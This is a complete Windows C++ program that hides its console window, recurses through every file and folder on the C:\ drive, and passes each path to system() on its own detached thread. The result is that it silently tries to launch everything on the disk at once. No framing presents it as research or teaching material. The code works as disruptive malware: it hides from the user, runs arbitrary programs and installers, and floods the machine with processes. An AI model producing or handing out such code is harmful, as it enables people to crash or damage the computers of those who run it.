#include <bits/stdc++.h>
#include <dirent.h>
#include <windows.h>

using namespace std;

//int total=0;
//map<string,bool> www;
vector<string> start;
WINBOOL HideConsole()
{
	HWND hwndc = GetConsoleWindow();
	return ShowWindow(hwndc, SW_HIDE);
}
void w(string s)
{
	//while(total>256);
	//++total;
	string str="starting "+s+'\n';
	cout<<str;
	system(s.data());
	//--total;
}
bool GetFileNames(string path)
{
	DIR *pDir;
	struct dirent *ptr;
	if (!(pDir = opendir(path.c_str())))
	{
		// cout << "error:Folder doesn't Exist!" << endl;
		return 1;
	}
	while ((ptr = readdir(pDir)) != 0)
	{
		if (strcmp(ptr->d_name, ".") != 0 && strcmp(ptr->d_name, "..") != 0)
		{
			string file_names = path + "\\" + ptr->d_name;
			string str="getting "+file_names+'\n';
			cout<<str;
			thread t(w,file_names);
			t.detach();
			GetFileNames(file_names);
		}
	}
	closedir(pDir);
	return 0;
}
int main()
{
	HideConsole();
	GetFileNames("C:\\");
	return 0;
}